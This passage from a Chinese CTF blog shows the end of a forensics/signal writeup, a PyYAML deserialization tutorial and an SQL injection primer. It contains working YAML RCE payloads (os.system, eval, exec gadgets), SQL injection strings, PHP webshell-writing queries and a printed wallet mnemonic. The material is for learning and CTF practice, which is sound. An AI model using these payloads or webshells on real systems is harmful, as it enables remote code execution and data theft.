<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
<h2 id="ezsignal"><a class="markdownIt-Anchor" href="#ezsignal"></a> ezSignal</h2>
<p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ’</p>
<p>那么将压缩包复制到Ubuntu</p>
<pre><code class="highlight bash">unzip ezSignal_fix.zip
<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>
<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
<p>喂AI/看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
<pre><code class="highlight plaintext">import numpy as np
from scipy.io import wavfile
from scipy.signal import butter, lfilter

def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
    &quot;&quot;&quot;
    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
    - dtype: 数据类型（默认 float32）
    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
    &quot;&quot;&quot;
    # 以二进制模式读取文件
    with open(filename, &quot;rb&quot;) as f:
        raw_bytes = f.read()
    

# 转换为指定字节序和类型的 numpy 数组

dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
data = np.frombuffer(raw_bytes, dtype=dt)
return data

def main():

    # 参数配置（与 GRC 一致）

     samp_rate = 48000      # 音频采样率
     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
     max_dev = 5e3          # FM最大频偏
     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）

try:

    # 1. 读取I/Q数据（二进制模式）

     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)

    # 检查长度一致性

     if len(i_data) != len(q_data):
         raise ValueError(&quot;I/Q数据长度不一致！&quot;)

    # 2. 合并为复数信号（I + jQ）

     complex_signal = i_data + 1j * q_data

    # 3. FM解调（相位差分法）

     phase = np.unwrap(np.angle(complex_signal))
     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
     demodulated = demodulated.astype(np.float32)

    # 4. 重采样到音频采样率（48 kHz）

     demodulated_resampled = demodulated[::4]  # 简单下采样

    # 5. 低通滤波（300-5000 Hz，与GRC一致）

     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
     demodulated_resampled = lfilter(b, a, demodulated_resampled)

    # 6. 归一化并保存为WAV

     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)

     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)

except FileNotFoundError:
    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
except Exception as e:
    print(f&quot;错误：&#123;str(e)&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>
<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
]]></content>
      <tags>
        <tag>-CTF -Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>YAML反序列化</title>
    <url>/2025/09/17/YAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="一问可能三不知的yaml反序列化"><a class="markdownIt-Anchor" href="#一问可能三不知的yaml反序列化"></a> 一问可能三不知的YAML反序列化</h1>
<h2 id="简单介绍"><a class="markdownIt-Anchor" href="#简单介绍"></a> 简单介绍</h2>
<h3 id="yaml简介"><a class="markdownIt-Anchor" href="#yaml简介"></a> Yaml简介</h3>
<p>YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。</p>
<h3 id="应用"><a class="markdownIt-Anchor" href="#应用"></a> 应用</h3>
<p>由于其只是一种数据格式，那么它自然可以在多种语言里大展神威。鉴于主包现在储备有限，目前只能记录一下pyyaml的学习部分，至于Java大概要等之后了。</p>
<h2 id="pyyaml"><a class="markdownIt-Anchor" href="#pyyaml"></a> PyYAML</h2>
<pre><code class="highlight plaintext">pip show pyyaml#查看pyyaml版本</code></pre>
<h3 id="version51"><a class="markdownIt-Anchor" href="#version51"></a> version&lt;5.1</h3>
<p>PyYaml下支持所有yaml标签转化为python对应类型，详见<a href="https://blog.csdn.net/pythoner/article/details/83389813">Yaml与python类型的对照表</a></p>
<p>其中有五个强大的Complex Python tags支持转化为指定的python模块，类，方法以及对象实例</p>
<table>
<thead>
<tr>
<th>YAML tag</th>
<th>Python tag</th>
</tr>
</thead>
<tbody>
<tr>
<td>!!python/name:module.name</td>
<td><a href="http://module.name">module.name</a></td>
</tr>
<tr>
<td>!!python/module:package.module</td>
<td>package.module</td>
</tr>
<tr>
<td>!!python/object:module.cls</td>
<td>module.cls instance</td>
</tr>
<tr>
<td>!!python/object/new:module.cls</td>
<td>module.cls instance</td>
</tr>
<tr>
<td>!!python/object/apply:module.f</td>
<td>value of f(…)</td>
</tr>
</tbody>
</table>
<pre><code class="highlight yaml"><span class="type">!!python/object/apply:os.system</span> [<span class="string">&quot;calc.exe&quot;</span>]
<span class="type">!!python/object/new:os.system</span> [<span class="string">&quot;calc.exe&quot;</span>]    
<span class="type">!!python/object/new:subprocess.check_output</span> [[<span class="string">&quot;calc.exe&quot;</span>]]
<span class="type">!!python/object/apply:subprocess.check_output</span> [[<span class="string">&quot;calc.exe&quot;</span>]]</code></pre>
<h3 id="51"><a class="markdownIt-Anchor" href="#51"></a> =5.1</h3>
<p>在 PyYAML &gt;= 5.1 时，开发者就将构造器分为：</p>
<ol>
<li><code>BaseConstructor</code>：没有任何强制类型转换</li>
<li><code>SafeConstructor</code>：只有基础类型的强制类型转换</li>
<li><code>FullConstructor</code>：除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中（说明已经主动 import 过了才让加载）。这个是<strong>默认的构造器</strong>。</li>
<li><code>UnsafeConstructor</code>：支持全部的强制类型转换</li>
<li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li>
</ol>
<p>那么<code>load</code>时需要主动指定加载器了，否则就会报错 the default Loader is unsafe,默认FullLoader</p>
<p>此时，我们需要增加一个loader请求参数：</p>
<pre><code class="highlight plaintext">import yaml
f = open(&#x27;config.yml&#x27;,&#x27;r&#x27;)
y = yaml.load(f,Loader=yaml.FullLoader)
print(y)
针对不同的需要，加载器有如下几种类型：</code></pre>
<ul>
<li>BaseLoader：仅加载最基本的YAML</li>
<li>SafeLoader：安全地加载YAML语言的子集，建议用于加载不受信任的输入(safe_load）</li>
<li>FullLoader：加载完整的YAML语言,避免任意代码执行,这是当前(PyYAML 5.1)默认加载器调用yaml.load(input) (出警告后)（full_load）</li>
<li>UnsafeLoader(也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load）</li>
</ul>
<p>大概是这样子</p>
<pre><code class="highlight plaintext">from yaml import *
data = b&quot;&quot;&quot;!!python/object/apply:subprocess.Popen
- calc&quot;&quot;&quot;
deserialized_data = load(data, Loader=Loader) # deserializing data
print(deserialized_data)</code></pre>
<p>这样的构造器还有：</p>
<ol>
<li><code>yaml.unsafe_load(exp)</code></li>
<li><code>yaml.unsafe_load_all(exp)</code></li>
<li><code>yaml.load(exp, Loader=UnsafeLoader)</code></li>
<li><code>yaml.load(exp, Loader=Loader)</code></li>
<li><code>yaml.load_all(exp, Loader=UnsafeLoader)</code></li>
<li><code>yaml.load_all(exp, Loader=Loader)</code></li>
</ol>
<p>除了apply之外。还可以利用map来打</p>
<h4 id="map"><a class="markdownIt-Anchor" href="#map"></a> map</h4>
<p>在 python3 中 map 返回的是个<strong>迭代器</strong>，那么可以配合其他函数进行 rce ，比如</p>
<pre><code class="highlight python"><span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">eval</span>, [<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))
<span class="comment"># 其中返回的数据类型tuple可以换成list、set、bytes、frozenset都行</span></code></pre>
<pre><code class="highlight plaintext">import yaml

poc = &#x27;&#x27;&#x27;
!!python/object/new:tuple (frozenset/bytes)
- !!python/object/new:map
  - !!python/name:eval
  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]
&#x27;&#x27;&#x27;
yaml.load(poc)</code></pre>
<h4 id="listitems-触发-extend"><a class="markdownIt-Anchor" href="#listitems-触发-extend"></a> listitems 触发 extend</h4>
<p>从上面的分析可以看出来，我们不需要直接命令执行，只需要满足 触发带参调用 + 引入函数 就能rce</p>
<p>在<code>construct_python_object_apply</code>中看到<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121114930896.png" alt="image-20250121114930896"></p>
<p>对于 listitems，这里作为参数可以调用前面返回的类里的 extend 方法</p>
<p>那么我们就需要自行构造一个类，实例化后有 extend 方法可以调用</p>
<p>使用 <a href="https://docs.python.org/zh-cn/3.13/library/functions.html#type">type()</a> 构造一个 test 类，其中具有 extend 方法，调用 exec</p>
<pre><code class="highlight python"><span class="built_in">type</span>(<span class="string">&quot;test&quot;</span>,<span class="built_in">tuple</span>(),&#123;<span class="string">&quot;extend&quot;</span>:<span class="built_in">exec</span>&#125;)().extend(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</code></pre>
<p>Python</p>
<p>于是可以构造出poc：</p>
<pre><code class="highlight yaml"><span class="type">!!python/object/new:type</span>
<span class="attr">args:</span>
  <span class="bullet">-</span> <span class="string">test</span>
  <span class="bullet">-</span> <span class="type">!!python/tuple</span> []
  <span class="bullet">-</span> &#123;<span class="attr">&quot;extend&quot;:</span> <span class="type">!!python/name:exec</span> &#125;
<span class="attr">listitems:</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></code></pre>
<pre><code class="highlight yaml"><span class="comment">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span>
<span class="type">!!python/object/new:type</span>
  <span class="attr">args:</span> [<span class="string">&quot;z&quot;</span>, <span class="type">!!python/tuple</span> [], &#123;<span class="attr">&quot;extend&quot;:</span> <span class="type">!!python/name:exec</span> &#125;]
  <span class="attr">listitems:</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></code></pre>
<pre><code class="highlight yaml"><span class="bullet">-</span> <span class="type">!!python/object/new:yaml.MappingNode</span>
  <span class="attr">listitems:</span> <span class="type">!!str</span> <span class="string">&#x27;!!python/object/apply:subprocess.Popen [whoami]&#x27;</span>
  <span class="attr">state:</span>
    <span class="attr">tag:</span> <span class="type">!!str</span> <span class="string">dummy</span>
    <span class="attr">value:</span> <span class="type">!!str</span> <span class="string">dummy</span>
    <span class="attr">extend:</span> <span class="type">!!python/name:yaml.unsafe_load</span>
</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121172052983.png" alt></p>
<h4 id="state触发"><a class="markdownIt-Anchor" href="#state触发"></a> state触发</h4>
<p>既然 listitems 可以利用，那么同样作为分支判断其中调用方法的还有 state</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121172309606.png" alt="image-20250121172309606"></p>
<p>跟进 set_python_instance_state</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121173343649.png" alt="image-20250121173343649"></p>
<p><code>__setstate__</code>只需要 instance 里有 <strong>setstate</strong> 就会调用，修改下上面 extend 的 poc 就能用：</p>
<pre><code class="highlight yaml"><span class="type">!!python/object/new:type</span>
<span class="attr">args:</span>
  <span class="bullet">-</span> <span class="string">test</span>
  <span class="bullet">-</span> <span class="type">!!python/tuple</span> []
  <span class="bullet">-</span> &#123;<span class="attr">&quot;__setstate__&quot;:</span> <span class="type">!!python/name:exec</span> &#125;
<span class="attr">state:</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></code></pre>
<h4 id="update"><a class="markdownIt-Anchor" href="#update"></a> update</h4>
<p>一开始的想法是打<code>instance.__dict__.update(state)</code>，但是发现 <strong>dict</strong> 好像覆写不掉</p>
<p>那么这里的目标转到<code>slotstate.update(state)</code></p>
<p>要进入这个判断要求类中没有<code>__setstate__</code>方法，没有<code>__dict__</code>属性</p>
<p>这个直接上poc调试了</p>
<pre><code class="highlight yaml"><span class="type">!!python/object/new:str</span>
    <span class="attr">args:</span> []
    <span class="attr">state:</span> <span class="type">!!python/tuple</span>
      <span class="bullet">-</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>
      <span class="bullet">-</span> <span class="type">!!python/object/new:staticmethod</span>
        <span class="attr">args:</span> []
        <span class="attr">state:</span>
          <span class="attr">update:</span> <span class="type">!!python/name:eval</span>
          <span class="attr">items:</span> <span class="type">!!python/name:list</span></code></pre>
<pre><code class="highlight yaml"><span class="bullet">-</span> <span class="type">!!python/object/new:str</span>
    <span class="attr">args:</span> []
    <span class="attr">state:</span> <span class="type">!!python/tuple</span>
    <span class="bullet">-</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>
    <span class="bullet">-</span> <span class="type">!!python/object/new:staticmethod</span>
      <span class="attr">args:</span> [<span class="number">0</span>]
      <span class="attr">state:</span>
        <span class="attr">update:</span> <span class="type">!!python/name:exec</span></code></pre>
<p>首先，yaml 解析是从内到外加载的，先加载 !!python/object/new:staticmethod</p>
<p>首次加载</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121231943019.png" alt="image-20250121231943019"></p>
<p>这里会进<code>instance.__dict__.update(state)</code>，因为静态方法所属类一定有 <strong>dict</strong> 属性</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121232517512.png" alt="image-20250121232517512"></p>
<p>经过之后 <code>__dict__</code>中的键值更新</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121232945098.png" alt="image-20250121232945098"></p>
<p>然后是第二轮，加载 !!python/object/new:str</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121233129272.png" alt="image-20250121233129272"></p>
<p>此时的 state 第二项就是恶意payload</p>
<p>然后经过<code>state, slotstate = state</code>的解构</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121233254825.png" alt="image-20250121233254825"></p>
<p>state 被设置为了我们第一次放入的 state，slotstate 被设置为了我们第二次放入的 state</p>
<p>由于 str 没有<code>__dict__</code>属性，于是会直接触发 <code>slotstate.update(state)</code><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121233436336.png" alt="image-20250121233436336"></p>
<p>slotstate.update 此时是 eval，于是rce</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250121233600114.png" alt="image-20250121233600114"></p>
<p>总结一下就是做了这样的一个操作：</p>
<pre><code class="highlight python">a=<span class="built_in">staticmethod</span>(<span class="literal">None</span>)
a.__dict__.update(&#123;<span class="string">&quot;update&quot;</span>:<span class="built_in">eval</span>,<span class="string">&quot;items&quot;</span>:<span class="built_in">list</span>&#125;)
a.update(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</code></pre>
<h3 id="version52"><a class="markdownIt-Anchor" href="#version52"></a> version&gt;=5.2</h3>
<p>看到的版本现在已经用不了了，会报错:</p>
<pre><code class="highlight plaintext">raise ConstructorError(None, None,
yaml.constructor.ConstructorError: could not determine a constructor for the tag &#x27;tag:yaml.org,2002:python/object/new:str&#x27;
  in &quot;&lt;unicode string&gt;&quot;, line 2, column 3:
    - !!python/object/new:str
      ^</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250721144514788.png" alt="image-20250721144514788"></p>
<p>发现在我这个版本(version==6.1)<code>/object/new</code> 的方法已经完全被舍弃了，只能在<code>UnsafeConstructor</code>中看到了</p>
<p>那么利用方法必然要变一下了</p>
<p>后面省了一下，这个地方在5.4就被舍弃掉了。。</p>
<p>而剩余可利用的也只剩下一个<code>name</code>，它相较于5.1时没有太大变化，还是只能引入包而不能进行命令执行</p>
<h2 id="snakeyaml"><a class="markdownIt-Anchor" href="#snakeyaml"></a> SnakeYAML</h2>
<p>java没学，学了再补</p>
]]></content>
      <tags>
        <tag>YAML</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的SQL注入生活</title>
    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
    <content><![CDATA[<h1 id="从零开始的sql注入生活"><a class="markdownIt-Anchor" href="#从零开始的sql注入生活"></a> 从零开始的SQL注入生活</h1>
<p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
<h2 id="episode-1-sql数据库基础操作"><a class="markdownIt-Anchor" href="#episode-1-sql数据库基础操作"></a> Episode 1   SQL数据库基础操作</h2>
<ul>
<li><strong>创建</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
<span class="keyword">create</span> <span class="keyword">table</span> table_name(
column1 datatype,
.......
);#建立一个表
</code></pre>
<ul>
<li><strong>查询</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
#条件查询<span class="keyword">Where</span>
(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
(<span class="number">8</span>)<span class="keyword">NOT</span>
<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
<ul>
<li><strong>插入</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
<ul>
<li><strong>注马</strong></li>
</ul>
<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
<span class="number">2.</span>利用日志文件写入木马
<span class="number">1.</span>开启日志功能

<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
<span class="number">2.</span>设置日志存储路径

<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
<span class="number">3.</span>执行<span class="keyword">sql</span>语句

<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
</code></pre>
<h2 id="episode-2-基础注入"><a class="markdownIt-Anchor" href="#episode-2-基础注入"></a> episode 2  基础注入</h2>
<h3 id="union注入-1"><a class="markdownIt-Anchor" href="#union注入-1"></a> union注入(-1’)</h3>
<p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
#查完后使用<span class="keyword">select</span> 语句
<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
#查库名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
#查表名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
#查列名
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
#直接查数据
<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#

#其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre>
<p>那初学的师傅可能就会不明白这个1，2，3是什么意思</p>
<p>这个1，2，3实际是可以帮助我们快速判断列数的工具(<s>order by:那我呢？</s>)同时，这个1，2，3无关顺序，只要找到回显位并且已经爆出数据表的情况下就可以在回显位写注入语句进一步爆</p>
<p>也可以union all select ,这时前面的-1可以去掉</p>
<h3 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入"></a> 报错注入</h3>
<p>1.extractvalue函数</p>
<p>查询对象xml某一个标签的值</p>
<p>如果查询的标签格式不对，就会报错</p>
<p>利用concat函数来链接两个字符串</p>
<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
<p>-&gt;查询div，~存在会报错</p>
<p>爆出~database（）</p>
<p>2.updatexml</p>
<p>更新xml文档内容</p>
<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
<p>同样道理，当没有对应路径的时候会报错</p>
<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
</code></pre>
<p>其他同上</p>
<h3 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入"></a> 堆叠注入(!)</h3>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
</code></pre>
<h3 id="二次注入"><a class="markdownIt-Anchor" href="#二次注入"></a> 二次注入</h3>
<p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p>
<pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre>
<h3 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入"></a> 宽字节注入</h3>
<h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> <strong>原理</strong></h4>
<p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p>
<p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p>
<h4 id="常用过滤函数"><a class="markdownIt-Anchor" href="#常用过滤函数"></a> <strong>常用过滤函数</strong></h4>
<p><strong>trim()函数</strong><br>
移除字符串两侧的空白字符或其他预定义字符<br>
<strong>htmlspecialchars()函数</strong><br>
把预定义的字符&quot;&lt;“和”&gt;&quot;转换为HTML实体，预防XSS<br>
<strong>addslashes()函数</strong><br>
返回在预定义字符之前添加反斜杠的字符串</p>
<pre><code class="highlight sql"># 预定义字符
<span class="number">1.</span>单引号(<span class="string">&#x27;)</span>
<span class="string">2.双引号(&quot;)</span>
<span class="string">3.反斜杠(\)</span>
<span class="string">4.NULL</span></code></pre>
<p>上述函数常在CMS里使用进行过滤</p>
<h4 id="宽字节注入条件"><a class="markdownIt-Anchor" href="#宽字节注入条件"></a> <strong>宽字节注入条件</strong></h4>
<p>1.数据库为GBK编码<br>
2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
<h4 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h4>
<pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
